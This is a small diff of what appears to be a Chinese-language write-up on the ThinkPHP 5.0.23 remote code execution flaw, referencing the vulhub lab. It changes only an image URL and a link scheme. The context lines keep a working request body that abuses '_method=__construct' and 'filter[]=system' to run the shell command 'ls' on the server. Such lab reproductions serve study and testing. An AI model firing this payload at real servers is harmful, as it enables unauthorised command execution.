@@ -29,8 +29,8 @@ Content-Length: 72
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
 ```
 
-![](http://cdn.laohuan.art/2020-06-14_13-39-28.png)
+![](http://qn.laohuan.xin/2020-06-14_13-39-28.png)
 
 #### 参考链接
 
-<https://github.com/vulhub/vulhub/blob/master/thinkphp/5.0.23-rce/README.zh-cn.md/>
+<http://github.com/vulhub/vulhub/blob/master/thinkphp/5.0.23-rce/README.zh-cn.md/>
